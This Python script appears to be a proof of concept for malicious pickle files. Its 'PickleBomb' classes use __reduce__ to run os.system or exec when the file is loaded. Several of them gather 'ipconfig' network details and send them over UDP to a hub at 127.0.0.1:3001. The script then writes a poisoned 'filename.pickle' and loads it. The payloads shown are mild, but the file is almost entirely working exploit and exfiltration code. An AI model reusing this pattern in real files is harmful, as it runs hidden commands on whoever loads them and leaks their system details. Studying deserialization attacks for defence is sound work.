import pickle
import os 
import pickletools
import udpCom
import subprocess



def connent2Hub(data):
    msg = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
    client = udpCom.udpClient(('127.0.0.1', 3001))
    resp = client.sendMsg(msg, resp=False)
    print(resp)
    client.disconnect()

class PickleBomb0:

    def __reduce__(self):
        cmd = ('dir')
        return os.system, (cmd,)


class PickleBomb1:

    def __reduce__(self):
        print("test")
        msg = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
        client = udpCom.udpClient(('127.0.0.1', 3001))
        resp = client.sendMsg(msg, resp=False)
        client.disconnect()
        print(resp)
        cmd = ('dir')
        return client.sendMsg, (msg,)


class PickleBomb2:

    def __reduce__(self):
        strcode = 'print("test")'
        return exec, (strcode,)

class PickleBomb3:
    msg = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
    client = udpCom.udpClient(('127.0.0.1', 3001))
    resp = client.sendMsg(msg, resp=False)
    print(resp)
    client.disconnect()

    def __reduce__(self):
        cmd = ('dir')
        return os.system, (cmd,)

obj = PickleBomb3()

pickledata = pickle.dumps(obj)
print(pickledata)

with open('filename.pickle', 'wb') as handle:
    pickle.dump(obj, handle, protocol=pickle.HIGHEST_PROTOCOL)


print(pickletools.dis(pickledata))

pickle.loads(pickledata)